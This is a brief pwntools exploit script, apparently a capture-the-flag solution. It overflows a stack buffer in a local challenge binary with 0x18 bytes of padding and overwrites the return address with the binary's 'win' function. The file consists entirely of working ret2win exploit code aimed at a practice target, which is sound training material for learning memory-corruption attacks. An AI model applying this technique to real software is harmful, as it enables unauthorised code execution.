from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = process('./chal')
elf = ELF('./chal')

win = elf.symbols['win']

p.sendline(b'a' * 0x18 + p64(win))

p.interactive()
